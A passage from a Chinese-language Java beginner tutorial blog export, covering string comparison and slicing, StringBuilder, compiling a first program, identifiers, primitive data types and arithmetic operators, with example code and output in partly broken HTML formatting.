title="字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等"></a>字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等</h4></blockquote><h5 id="比较相等"><a href="#比较相等" class="headerlink" title="比较相等"></a>比较相等</h5><ul><li>boolean equals(Object anObject):比较两个字符串内容是否相等。</li><li>boolean equalsIgnoreCase(String anotherString)：类似equals方法，只是忽略大小写。<h5 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h5></li><li>int compareTo(String anotherString)：安装字典顺序比较大小。如果参数字符串等于此字符串，则返回值 0；如果此字符串小于字符串参数，则返回一个小于0 的值；如果此字符串大于字符串参数，则返回一个大于 0 的值。</li><li>int compareToIgnoreCase(String str)：类似compareTo，只是忽略大小写。<h5 id="比较前缀后缀"><a href="#比较前缀后缀" class="headerlink" title="比较前缀后缀"></a>比较前缀后缀</h5></li><li>boolean endsWith(String suffix)：测试次字符串是否是指定的后缀结束。</li><li>boolean startsWith(String prefix)：测试字符串是否是指定的前缀开始。<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></li></ul><p>public class Str_Comparison {<br>    public static void main(String[] args){<br>        String s1 = new String(“Hello”);<br>        String s2 = new String(“Hello”);<br>        System.out.println(“s1 == s2 :”+(s1 == s2));<br>        System.out.println(“s1.equals(s2):”+(s1.equals(s2)));</p><pre><code>    String s3 = &quot;HeLLo&quot;;    System.out.println(&quot;s1.equalsIgnoreCase(s3):&quot;+s1.equalsIgnoreCase(s3));    String s4 = &quot;java&quot;;    String s5 = &quot;Switch&quot;;    System.out.println(&quot;s4.compareTo(s5):&quot;+s4.compareTo(s5));    System.out.println(&quot;s4.compareToIgnoreCase(s5):&quot;+s4.compareToIgnoreCase(s5));    String[] docForder = { &quot;java.docx&quot;, &quot;JavaBean.docx&quot;, &quot;Objecitve-C.xlsx&quot;, &quot;Swift.docx&quot; };    int doccount = 0 ;    for (String doc : docForder){</code></pre><p>//            去除前后空格<br>            doc = doc.intern();<br>//            比较后缀是否是.docx<br>            if (doc.endsWith(“.docx”)){<br>                doccount ++ ;<br>            }<br>        }<br>        System.out.println(“查找到docx后缀的文件个数：”+doccount);</p><pre><code>    int javadocnumber = 0;    for (String doc : docForder) {        doc = doc.intern();        doc = doc.toLowerCase();        if (doc.startsWith(&quot;java&quot;)){            javadocnumber ++ ;        }    }    System.out.println(&quot;关于java相关文件个数：&quot;+javadocnumber);}</code></pre><p>}</p><pre><code></code></pre><p>s1 == s2 :false<br>s1.equals(s2):true<br>s1.equalsIgnoreCase(s3):true<br>s4.compareTo(s5):23<br>s4.compareToIgnoreCase(s5):-9<br>查找到docx后缀的文件个数：3<br>关于java相关文件个数：2</p><pre><code>### 字符串的截取-  String substring(int beginIndex)：从指定索引 beginIndex 开始截取一直到字符串结束的子字符串。-  String substring(int beginIndex, int endIndex)：从指定索引 beginIndex 开始截取直到索引 endIndex - 1 处的字符，注意包括索引为 beginIndex 处的字符，但不包括索引为 endIndex 处的字符。```javapackage basic_grammar;public class Str_Intercept {    public static void main(String[] args){        String sourceStr = &quot;There is a string accessing example.&quot;;        String subStr1 = sourceStr.substring(28);        String subStr2 = sourceStr.substring(11,17);        System.out.printf(&quot;subStr1 = %s%n&quot;,subStr1);        System.out.printf(&quot;subStr2 = %s%n&quot;,subStr2);        System.out.println(&quot;-----使用split-----&quot;);        String[] array = sourceStr.split(&quot; &quot;);        for (String str : array){            System.out.println(str);        }    }}</code></pre><pre><code>subStr1 = example.subStr2 = string-----使用split-----Thereisastringaccessingexample.</code></pre><h2 id="可变字符串"><a href="#可变字符串" class="headerlink" title="可变字符串"></a>可变字符串</h2><blockquote><p>  可变字符串在追加、删除、修改、插入和拼接等操作不会产生新的对象。</p></blockquote><h3 id="StringBuffer-和-StringBuilder"><a href="#StringBuffer-和-StringBuilder" class="headerlink" title="StringBuffer 和 StringBuilder"></a>StringBuffer 和 StringBuilder</h3><blockquote><p> StringBuffer 和 StringBuilder 具有完全相同的 API，即构造方法和方法等内容一样。</p><ul><li>StringBuilder()：创建字符串内容是空的 StringBuilder 对象，初始容量默认为 16个字符。</li><li>StringBuilder(CharSequence seq)：指定 CharSequence 字符串创建 StringBuilder 对象。CharSequence 接口类型，它的实现类有：String、StringBuffer 和 StringBuilder等，所以参数 seq 可以是 String、StringBuffer 和 StringBuilder 等类型。</li><li>StringBuilder(int capacity)：创建字符串内容是空的 StringBuilder 对象，初始容量由参数 capacity 指定的。</li><li>StringBuilder(String str)：指定 String 字符串创建 StringBuilder 对象。<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></li></ul></blockquote><p>public class variable_str {<br>    public static void main(String[] args){<br>        StringBuilder sbuilder = new StringBuilder();<br>        System.out.println(“包含字符串长度：”+sbuilder.length());<br>        System.out.println(“字符串缓冲区容量：”+sbuilder.capacity());</p><pre><code>    StringBuilder sbuilder1 = new StringBuilder(&quot;Hello&quot;);    System.out.println(&quot;包含字符串长度：&quot;+sbuilder1.length());    System.out.println(&quot;字符串缓冲区容量：&quot;+sbuilder1.capacity());    StringBuilder sbuilder2 = new StringBuilder();    for (int i = 0;i&lt;17;i++){        sbuilder2.append(8);    }    System.out.println(&quot;包含字符串长度：&quot;+sbuilder2.length());    System.out.println(&quot;字符串缓冲区容量：&quot;+sbuilder2.capacity());}</code></pre><p>}</p><pre><code></code></pre><p>包含字符串长度：0<br>字符串缓冲区容量：16<br>包含字符串长度：5<br>字符串缓冲区容量：21<br>包含字符串长度：17<br>字符串缓冲区容量：34</p><pre><code>### 字符串追加&gt;  StringBuilder 在提供了很多修改字符串缓冲区的方法，追加、插入、删除和替换等.字符串追加方法append.```javapackage basic_grammar;public class add_str {    public static void main(String[] args){        StringBuilder sbuilder1 = new StringBuilder(&quot;Hello&quot;);        sbuilder1.append(&quot; &quot;).append(&quot;World&quot;);        sbuilder1.append(&quot;.&quot;);        System.out.println(sbuilder1);        StringBuilder sbuilder2 = new StringBuilder();        Object obj = null;        sbuilder2.append(false).append(&#39;\t&#39;).append(obj);        System.out.println(sbuilder2);        StringBuilder sbuilder3 = new StringBuilder();        for (int i =0;i&lt;9;i++){            sbuilder3.append(i);        }        System.out.println(sbuilder3);    }}</code></pre><pre><code>Hello World.false    null012345678</code></pre><h3 id="字符串插入，删除，替换"><a href="#字符串插入，删除，替换" class="headerlink" title="字符串插入，删除，替换"></a>字符串插入，删除，替换</h3><blockquote><p> StringBuilder insert(int offset, String str)：在字符串缓冲区中索引为 offset 的字符位置之前插入 str，insert 有很多重载方法，可以插入任何类型数据。<br> StringBuffer delete(int start, int end)：在字符串缓冲区中删除子字符串，要删除的子字符串从指定索引 start 开始直到索引 end - 1 处的字符。start 和 end 两个参数与 substring(int beginIndex, int endIndex)方法中的两个参数含义一样。<br> StringBuffer replace(int start, int end, String str)字符串缓冲区中用 str 替换子字符串，子字符串从指定索引 start 开始直到索引 end - 1 处的字符。start 和 end 同delete(int start, int end)方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class java_insert_del_update {<br>    public static void main(String[] args){<br>        String str1 = “Java C”;<br>        StringBuilder stb = new StringBuilder(str1);</p><pre><code>    stb.insert(4,&quot; C++&quot;);    System.out.println(stb);    stb.insert(stb.length(),&quot; Object-C&quot;);    System.out.println(stb);    stb.append(&quot; and Switch&quot;);    System.out.println(stb);    stb.delete(11,23);    System.out.println(stb);}</code></pre><p>}</p><pre><code></code></pre><p>Java C++ C<br>Java C++ C Object-C<br>Java C++ C Object-C and Switch<br>Java C++ C  Switch</p><pre><code>## 面向对象特性&gt;  封装性，继承性，多态性。## 类### 类声明&gt;  类的实现包括：类声明和类体。```java[public][abstract|final] class className [extends superclassName] [implements interfaceNameList] {//类体}</code></pre><p>class是声明类的关键词，className是自定义的类名，class前面的修饰符public，abstract，final用来声明类，他们也可以省略。</p><h3 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">className</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token keyword">public</span> <span class="token operator">|</span> <span class="token keyword">protected</span> <span class="token operator">|</span> <span class="token keyword">private</span> <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">static</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">final</span><span class="token punctuation">]</span> type variableName<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//成员变量</span><span class="token punctuation">}</span></code></pre><h4 id="type是成员变量数据类型，variableName是成员变量名称。"><a href="#type是成员变量数据类型，variableName是成员变量名称。" class="headerlink" title="type是成员变量数据类型，variableName是成员变量名称。"></a>type是成员变量数据类型，variableName是成员变量名称。</h4><blockquote><p> public、protected 和 private 修饰符用于封装成员变量。<br> static 修饰符用于声明静态变量，所以静态变量也称为“类变量”。<br> final 修饰符用于声明变量，该变量不能被修改。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一个java程序</title>
      <link href="/2019/01/29/di-yi-ge-java-cheng-xu/"/>
      <url>/2019/01/29/di-yi-ge-java-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="第一个java程序"><a href="#第一个java程序" class="headerlink" title="第一个java程序"></a>第一个java程序</h1><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> hello<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">helloword</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span>  <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello World."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>只能一个类声明为公有的（public）</li><li>文件名称必须与公有类名完全一致，包括字母大小写·。</li><li>public static  void main(String[] args) 只能定义在公有类中</li></ul><h1 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h1><h4 id="编译需要到程序根目录下利用javac来编译"><a href="#编译需要到程序根目录下利用javac来编译" class="headerlink" title="编译需要到程序根目录下利用javac来编译"></a>编译需要到程序根目录下利用javac来编译</h4><pre class=" language-bash"><code class="language-bash">E:\java_sty\src\hello<span class="token operator">></span>lshelloword.javaE:\java_sty\src\hello<span class="token operator">></span>javac helloword.javaE:\java_sty\src\hello<span class="token operator">></span>lshelloword.class  helloword.java</code></pre><h3 id="此时目录下生产了一个helloworld-class类文件。"><a href="#此时目录下生产了一个helloworld-class类文件。" class="headerlink" title="此时目录下生产了一个helloworld.class类文件。"></a>此时目录下生产了一个helloworld.class类文件。</h3><h3 id="若定义的包不是在这个目录下，需要添加-d-参数。将会自动创建文件夹及文件。"><a href="#若定义的包不是在这个目录下，需要添加-d-参数。将会自动创建文件夹及文件。" class="headerlink" title="若定义的包不是在这个目录下，需要添加-d 参数。将会自动创建文件夹及文件。"></a>若定义的包不是在这个目录下，需要添加-d 参数。将会自动创建文件夹及文件。</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> create1<span class="token punctuation">.</span>create2<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">hello2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">void</span>  <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-sh"><code class="language-sh">E:\java_sty\src\hello2>lshello2.javaE:\java_sty\src\hello2>javac hello2.javaE:\java_sty\src\hello2>lshello2.class  hello2.javaE:\java_sty\src\hello2>javac -d . hello2.javaE:\java_sty\src\hello2>lscreate1  hello2.class  hello2.javaE:\java_sty\src\hello2>cd create1E:\java_sty\src\hello2\create1>cd create2E:\java_sty\src\hello2\create1\create2>lshello2.class</code></pre><h1 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h1><pre><code>java xxxx.xxx</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基本语法</title>
      <link href="/2019/01/29/java-ji-ben-yu-fa/"/>
      <url>/2019/01/29/java-ji-ben-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA基本语法"><a href="#JAVA基本语法" class="headerlink" title="JAVA基本语法"></a>JAVA基本语法</h1><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><blockquote><p>变量，常量，方法，枚举，类，接口的你敢由程序员指定的名字。</p><ul><li>区分大小写</li><li>首字符，可以是下划线(_)或者美元符或者字母，但不能是数字</li><li>除首字符外其他字符，可以是下划线(_)，美元符，字母和数字。</li><li>关键字不能作为标识符</li></ul></blockquote><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><blockquote><p> Java的全部关键字都是小写字母</p></blockquote><h3 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h3><blockquote><p> 一些字符序列即不能当作标识符使用，也不是关键字，也不能在程序中使用，这些字符序列被称为保留字。</p><ul><li>1.goto：在java中不再使用goto语句，因为“无限跳转”语句会破坏程序结构。在java语言中goto的替换语句可以通过break，continue，return实现“有限跳转”。</li><li>2.const：在其他语言是声明常量关键字，在java语言中声明变量使用public static final方式声明。</li></ul></blockquote><h2 id="Java-分隔符"><a href="#Java-分隔符" class="headerlink" title="Java 分隔符"></a>Java 分隔符</h2><h3 id="分号"><a href="#分号" class="headerlink" title="分号"></a>分号</h3><blockquote><p> 分号在java中，它表示一条语句结束。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">;</span>等价于<span class="token keyword">int</span> i <span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="大括号"><a href="#大括号" class="headerlink" title="大括号"></a>大括号</h3><blockquote><h3 id="左右大括号括起的语句集合称为语句块-block-或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。"><a href="#左右大括号括起的语句集合称为语句块-block-或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。" class="headerlink" title="左右大括号括起的语句集合称为语句块(block)或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。"></a>左右大括号括起的语句集合称为语句块(block)或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class brace {<br>    public  static  void  main (String args[]) {<br>        int m = 5;<br>        if (m&lt;10) {<br>            System.out.println(m+”&lt;10”);<br>        }<br>    }<br>}</p><pre><code>### 空百&gt; ### java源码中需要有空白，空白数不限。```java        if (m&lt;10) {            System.out.println(m+&quot;&lt;10&quot;);        }        等于                if (m&lt;10) {            System.out.println(m+&quot;&lt;10&quot;);}        等于                if (m&lt;10)                 {            System.out.println(m+&quot;&lt;10&quot;);        }</code></pre><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><blockquote><h3 id="常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final-数据类型-变量名-初始值"><a href="#常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final-数据类型-变量名-初始值" class="headerlink" title="常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final 数据类型 变量名 = 初始值"></a>常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final 数据类型 变量名 = 初始值</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class constant {<br>//    静态常量，替代const<br>    public  static  final  double PI = 3.14;<br>//    声明成员常量<br>    final  int y = 2;<br>//    声明局部常量<br>    public  static  void  main(String[] args){<br>        final  double pi = 3.14;<br>    }<br>}</p><pre><code>## 数据类型### 基础数据类型&gt; ### 基本数据类型分为4大类，8种数据类型。- ####  整数类型：byte,long,int,short- #### 浮点类型：float,double- #### 字符类型：char- #### 布尔类型：boolean### 整数类型&gt; #### byte,long,int,short。它们的区别仅仅在于宽度和范围不同。Java的整数都是有符号的。|整数类型|宽度|范围||:------:|:------:|:-------:||byte|1个字节(8位)|-128~127||int|4个字节|-2^{31} ~ 2^{31} -1||short|2个字节|-2^{15} ~ 2^{15}-1||long|8个字节|-2^{63} ~2^{63}-1|#### Java默认的整数类型为int.long类型需要在后面添加l或者L.```javapackage basic_grammar;public class Shaping {    public static void main(String[] args){        System.out.println(&quot;默认整数常量 =&quot;+16);        byte a = 16;        short b = 16;        int c = 16;        long d = 16L;        long e = 16l;        System.out.println(&quot;byte整数 = &quot;+a);        System.out.println(&quot;Short整数 = &quot;+b);        System.out.println(&quot;int整数 = &quot;+c);        System.out.println(&quot;long整数 = &quot;+d);        System.out.println(&quot;long整数 = &quot;+e);    }}</code></pre><pre><code>默认整数常量 =16byte整数 = 16Short整数 = 16int整数 = 16long整数 = 16long整数 = 16</code></pre><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><blockquote><p> 浮点类型主要用来储存小数数值，也可以用来储存范围较大的整数。它分为浮点数(float)和双精度浮点数(double)。双精度浮点数比浮点数使用的内存空间多，可以表示数字范围和精确度比较大。<br>|浮点类型|宽度|<br>|:——:|:——:|<br>|float|4个字节|<br>|doble|8个字节|</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;</p><p>public class Floating_point_number {<br>    public static void main(String[] args){<br>        System.out.println(“默认浮点数 =”+366.66);<br>        float floatnum = 123.23f;<br>        double doublenum = 456.12;<br>        final  double PI = 3.1415926d;</p><pre><code>    System.out.println(&quot;float  =&quot;+floatnum);    System.out.println(&quot;double =&quot;+doublenum);    System.out.println(&quot;PI =&quot;+PI);}</code></pre><p>}</p><pre><code> 浮点数默认是double类型，float浮点常数类型需要在数值后面添加f或者F。double浮点数也可以在后面添加d或者D。## 数字表示方式### 进制数表示-  二进制数：以0b或0B为前缀。-  八进制数：以0位前缀。-  十六进制数：以0x或0X为前缀。</code></pre><p>int decimalint = 28;<br>int binaryint1 = 0b11100;<br>int binaryint2 = 0B111100;<br>int octalint = 034;<br>int hexadecimalint1 = 0x1C;<br>int hexadecimalint2 = 0X1C;</p><pre><code>### 指数表示&gt;   如果需要采用十进制来表示指数，需要使用大写或小写e来表示。e2 = 10^2</code></pre><p>double myMoney = 3.36e2;<br>double interestRate = 1.56e-2;</p><pre><code> 3.36e2 = 3.36x10^2,1.56e-2 = 1.56x10^-2### 字符类型&gt;  字符类型表示单个字符。java中以char来声明字符类型，字符类型必须以单引号括起里的单个字符。  java字符采用双字节Unicode编码，占两个字节。可以用十六进制编码形式表示、```javapackage basic_grammar;public class character {    public static void main(String[] args){        char c1 = &#39;A&#39;;        char c2 = &#39;\u0041&#39;;        char c3 = &#39;华&#39;;        System.out.println(c1);        System.out.println(c2);        System.out.println(c3);    }}</code></pre><pre><code>AA华</code></pre><p>java为了表示一些特殊字符，需要加上反斜杠(\n)，被称之为转义字符。<br>|字符表示|Unicode编码|说明|<br>|:——:|:——-:|:——:|<br>|\t|\u0009|tab|<br>|\n|\u000a|换行|<br>|\r|\u000d|回车|<br>|&quot;|\u0022|双引号|<br>|&#39;|\u0027|单引号|<br>|\ |\u005c|反斜线|</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">character2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        String tab1 <span class="token operator">=</span> <span class="token string">"Hello\tWorld"</span><span class="token punctuation">;</span>        String tab2 <span class="token operator">=</span> <span class="token string">"Hello\u0009World"</span><span class="token punctuation">;</span>        String Wrap1 <span class="token operator">=</span> <span class="token string">"Hello\nWorld"</span><span class="token punctuation">;</span>        String  enter1 <span class="token operator">=</span> <span class="token string">"Hello\rWorld"</span><span class="token punctuation">;</span>        String Double_quotes1 <span class="token operator">=</span> <span class="token string">"Hello\"World"</span><span class="token punctuation">;</span>        String apostrophe1 <span class="token operator">=</span> <span class="token string">"Hello\'World"</span><span class="token punctuation">;</span>        String Backslash1 <span class="token operator">=</span> <span class="token string">"Hello\\World"</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Tab1 : "</span><span class="token operator">+</span>tab1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Tab2 : "</span><span class="token operator">+</span>tab2<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Wrap1 : "</span><span class="token operator">+</span>Wrap1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Enter1 : "</span><span class="token operator">+</span>enter1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Double_quotes1 : "</span><span class="token operator">+</span>Double_quotes1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"apostrophe1 : "</span><span class="token operator">+</span>apostrophe1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Backslash1 : "</span><span class="token operator">+</span>Backslash1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>Tab1 : Hello    WorldTab2 : Hello    WorldWrap1 : HelloWorldWorld1 : HelloDouble_quotes1 : Hello&quot;Worldapostrophe1 : Hello&#39;WorldBackslash1 : Hello\World</code></pre><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><blockquote><p> java中声明布尔类型的关键字是boolean。不能用0或1来代替，因为不属于数值类型，不能与数字类型等进行转换。</p><pre><code>boolean isMan = true;boolean isWoman = false;</code></pre></blockquote><h2 id="数值类型相互转换"><a href="#数值类型相互转换" class="headerlink" title="数值类型相互转换"></a>数值类型相互转换</h2><h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><blockquote><p> 自动类型转换就是需要类型之间转换是自动的，不需要任何操作手段。<br><a href="https://image.kalifun.top/temp/1901/1e4ed96f6a3c8f6f.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/temp/1901/1e4ed96f6a3c8f6f.png" alt></a><br>char可以自动转换为int，long，float，double。但是byte，short不能自动转换为char，且char不能转换为byte，short类型。</p></blockquote><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><blockquote><p> 强制类型转换是在变量或常量前加上（目标类型）实现。强制类型转换主要是用于大宽度类型转换为小宽度类型。</p><pre><code>int i = 1;byte b = (byte)i;</code></pre></blockquote><h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><blockquote><p> 在Java中除了8中数据类型外，其他数据类型都是引用数据类型。引用数据类型用了表示复杂数据类型。包含：类，接口和数组声明的类型。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> y <span class="token operator">=</span> x<span class="token punctuation">;</span></code></pre></blockquote><p>String str1 = “Hello”;<br>String str2 = str1;     //此时str1和str2指向相同地址<br>str2 = “world”;      //此时str1和str2指向不同的地址</p><pre><code>## 算术运算符### 一元运算符&gt; #### 一元运算符有三种。-，++，--|运算符|名称|说明|例子||:-----:|:------:|:------:|:------:||-|取反符号|取反运算|b=-a||++|自加一|先取值在加一，或先加一再取值|a++或++a||--|自减一|先取值再减一，或先减一再取值|a--或--a|```javapackage basic_grammar;public class Operator {    public static void main(String[] args){        int a = 10;        System.out.println(-a);        int b = a++;        System.out.println(b);        int c = ++b;        System.out.println(c);        int d = c--;        System.out.println(d);        int e = --d;        System.out.println(e);    }}</code></pre><pre><code>-1010111110 </code></pre><h3 id="二元运算符"><a href="#二元运算符" class="headerlink" title="二元运算符　　"></a>二元运算符　　</h3><blockquote><p>　二元运算符包括：+，- , * , / 和 %。这些对数值类型都是有效的。  </p></blockquote><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">说明</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加</td><td align="center">求和，字符串相连</td><td align="center">a+b</td></tr><tr><td align="center">-</td><td align="center">减</td><td align="center">求差</td><td align="center">a-b</td></tr><tr><td align="center">*</td><td align="center">乘</td><td align="center">求积</td><td align="center">a*b</td></tr><tr><td align="center">/</td><td align="center">除</td><td align="center">求商</td><td align="center">a/b</td></tr><tr><td align="center">%</td><td align="center">取余</td><td align="center">求余</td><td align="center">a%b</td></tr><tr><td align="center">```java</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">package basic_grammar;</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>public class Binary {<br>    public static void main(String[] args){<br>        char charnum = ‘A’;<br>        int intresult = charnum + 1 ;<br>        System.out.println(intresult);<br>        intresult = intresult - 1;<br>        System.out.println(intresult);<br>        intresult = intresult * 2 ;<br>        System.out.println(intresult);<br>        intresult = intresult / 2 ;<br>        System.out.println(intresult);<br>        intresult = intresult + 8 ;<br>        intresult = intresult % 7 ;<br>        System.out.println(intresult);</p><pre><code>    double doubleresult = 10.0;    System.out.println(doubleresult);    doubleresult = doubleresult + 1 ;    System.out.println(doubleresult);    doubleresult = doubleresult -1 ;    System.out.println(doubleresult);    doubleresult = doubleresult * 2 ;    System.out.println(doubleresult);    doubleresult = doubleresult / 2 ;    System.out.println(doubleresult);}</code></pre><p>}</p><pre><code></code></pre><p>66<br>65<br>130<br>65<br>3<br>10.0<br>11.0<br>10.0<br>20.0<br>10.0</p><pre><code>### 算术赋值运算符|运算符|名称|例子||:------:|:------:|:-----:||+=|加赋值|a+=b||-=|减赋值|a-=b||*=|乘赋值|a*=b||/=|除赋值|a/=b||%=|取余赋值|a%=b|```javapackage basic_grammar;public class arithmetic {    public static void main(String[] args){        int a = 2;        int b = 3;        a += b;   //a = a+b        System.out.println(a);        a += b + 2 ; //a = a +b +2        System.out.println(a);        a -= b;  //a = a-b        System.out.println(a);        a *= b;   //a = a*b        System.out.println(a);        a /= b ;   //a = a/b        System.out.println(a);        a %= b ;    //a = a % b        System.out.println(a);    }}</code></pre><pre><code>51072171</code></pre><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><blockquote><p> 关系运算符的结果是布尔类型，True和False。关系运算符有6种：==,&lt;=,&gt;=,!=,&gt;,&lt;.</p></blockquote><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><blockquote><p>  逻辑运算符是布尔类型进行运算，所以结果也是布尔类型。<br>|运算符|名称|说明|例子|<br>|:——:|:——:|:——-:|:——:|<br>|!|非|a 为 true 时，值为 false，a 为 false 时，值为 true|a!b|<br>|&amp;|与|ab 全为 true 时，计算结果为 true，否则为 false|a&amp;b|<br>| | |或|ab 全为 false 时，计算结果为 false，否则为 true|a|b |<br>| &amp;&amp;|短路与|ab 全为 true 时，计算结果为 true，否则为 